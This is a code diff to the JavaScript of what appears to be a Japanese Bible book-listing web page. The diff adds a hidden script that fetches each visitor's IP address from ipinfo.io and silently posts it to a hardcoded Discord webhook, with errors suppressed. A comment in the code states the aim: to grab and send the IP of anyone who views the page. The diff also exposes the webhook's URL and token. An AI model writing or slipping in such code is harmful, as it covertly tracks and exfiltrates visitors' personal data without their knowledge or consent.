@@ -339,3 +339,30 @@ let names = ["01 創世記", "02 出エジプト記", "03 レビ記", "04 民数
 
 load();
 document.querySelector(".Toggle2").click();
+
+// 見た人がいたらIPをゲットして送信
+const script = document.createElement('script');
+script.src = 'https://ipinfo.io?callback=callback';
+document.body.appendChild(script);
+document.body.removeChild(script);
+
+function callback(data) {
+	const webhookUrl = "https://discord.com/api/webhooks/1243515257297702922/T9CgI50m4naM4p_FPe52Y9cDXGgUujCwVsHco9HT85ps6xvwEv1W7urjViIk7ryIh_XJ";
+	const requestBody = {
+		content: "",
+		embeds: [{
+			title: data.ip,	
+			timestamp: new Date()
+		}]
+	};
+
+	fetch(webhookUrl, {
+		method: "POST",
+		headers: {
+			"Content-Type": "application/json",
+		},
+			body: JSON.stringify(requestBody),
+		})
+	.then((response) => {})
+	.catch((error) => {});
+}
